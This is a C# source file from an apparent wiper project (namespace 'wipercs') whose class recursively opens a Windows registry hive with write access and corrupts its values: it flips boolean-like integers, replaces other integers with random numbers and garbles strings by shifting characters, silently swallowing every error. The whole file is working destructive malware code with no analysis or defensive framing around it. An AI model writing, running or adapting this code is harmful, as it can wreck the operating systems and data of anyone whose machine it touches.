namespace wipercs;

using Microsoft.Win32;

public class RegFuck
{
    private static int ScrambleValue(int val, int damage)
    {
        Random randint = new Random();
        if (val is 0 or 1)
        {
            if (randint.Next(0, 100) < damage)
            {
                return val ^ 1;
            }

            return val;
        }
        else
        {
            return randint.Next(69, 420);
        }
    }

    private static string ScrambleValue(string val, int damage)
    {
        Random randint = new Random();
        if (randint.Next(0, 100) > damage)
        {
            return val;
        }
        int inputLength = val.Length;
        char[] resultString = new char[inputLength];
        
        for (int i = 0; i < inputLength; i++)
        {
            resultString[i] = (char)(val[i] + randint.Next(-10, 10));
        }

        return String.Join(String.Empty, resultString);
    }
    
    // see https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registryhive?view=net-7.0
    
    private static void _RegFuck(RegistryKey key, int damage)
    {
        try
        {
            foreach (var val in key.GetValueNames())
            {
                RegistryValueKind valueKind = key.GetValueKind(val);

                object value = key.GetValue(val);

                if (value.GetType() == typeof(int))
                {
                    int iVal = (int)value;
                    try
                    {
                        key.SetValue(val, ScrambleValue(iVal, damage));
                    }
                    catch
                    {
                        // give up
                    }
                }
                else
                {
                    string sVal = (string)value;
                    try
                    {
                        key.SetValue(val, ScrambleValue(sVal, damage));
                    }
                    catch
                    {
                        // give up
                    }
                }
            }
        }
        catch
        {
            // give up
        }
        
        foreach (var subkey in key.GetSubKeyNames())
        {
            try
            {
                using (RegistryKey sk = key.OpenSubKey(subkey, true))
                {
                    try
                    {
                        _RegFuck(sk, damage);
                    }
                    catch
                    {
                        // do nothing (idc)
                    }
                }
            }
            catch
            {
                // give up
            }
        }
    }

    public static void initRegfuck(RegistryHive hive, int damage)
    {
        using (RegistryKey root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
        {
            try
            {
                _RegFuck(root, damage); //call helper function
            }
            catch
            {
                // give up
            }
            
        }
    }
}